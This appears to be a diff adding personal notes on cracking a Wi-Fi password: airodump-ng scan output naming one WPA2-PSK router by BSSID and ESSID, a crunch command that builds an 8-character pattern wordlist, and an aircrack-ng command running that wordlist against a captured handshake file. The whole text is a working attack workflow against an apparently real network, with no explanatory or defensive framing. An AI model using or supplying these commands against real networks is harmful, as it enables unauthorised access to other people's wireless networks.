@@ -1,0 +1,9 @@
+BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                
+                                                                                                
+ F0:EB:D0:63:C2:3A  -59      131       11    0  11  270   WPA2 CCMP   PSK  PHICOMM_63C23A  
+ 
+ 
+ 
+ 
+ crunch 8 8 -t YYS^%%%%  -d 4% -b 20mb -o START  
+ sudo aircrack-ng -w passwd.txt longas.txt-01.ivs
